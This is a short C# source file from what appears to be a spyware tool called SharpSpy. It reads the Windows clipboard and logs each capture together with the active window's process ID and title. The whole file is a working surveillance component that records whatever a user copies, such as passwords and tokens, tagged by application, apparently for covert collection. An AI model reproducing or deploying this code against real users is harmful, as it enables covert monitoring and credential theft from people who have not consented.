using System.Text;
using System.Threading;

namespace SharpSpy
{
    // https://github.com/slyd0g/SharpClipboard
    internal class ClipboardUtil
    {
        private const string LOG_SOURCE = "clipboard";

        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    // Use a fully qualified name for Clipboard otherwise it
                    // will end up calling itself.
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }

        public static void LogClipboard(Logger logger)
        {
            var activeWindow = NativeMethods.GetForegroundWindow();
            uint processId;

            NativeMethods.GetWindowThreadProcessId(activeWindow, out processId);

            var length = NativeMethods.GetWindowTextLength(activeWindow);
            var windowText = new StringBuilder(length + 1);
            NativeMethods.GetWindowText(activeWindow, windowText, windowText.Capacity);

            var text = GetText();

            logger.Log(LOG_SOURCE, $"{processId}/\"{windowText}\": {text}");
        }
    }
}
